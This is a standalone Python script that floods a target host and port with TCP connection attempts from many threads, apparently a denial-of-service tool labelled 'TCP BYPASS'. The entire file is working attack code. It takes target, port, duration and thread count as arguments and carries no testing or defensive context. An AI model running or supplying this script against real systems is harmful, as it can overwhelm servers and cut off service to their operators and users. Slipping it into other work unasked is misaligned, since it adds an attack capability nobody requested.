#!/usr/bin/env python3
import socket, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 800

def flood():
    try:
        end = time.time() + duration
        count = 0
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('', random.randint(1024, 65535)))
                s.connect_ex((target, port))
                s.close()
                count += 1
                if count % 10000 == 0:
                    sys.stderr.write(f"TCP BYPASS: {count} connections\n")
            except:
                pass
        sys.stderr.write(f"TCP BYPASS completed: {count} connections\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
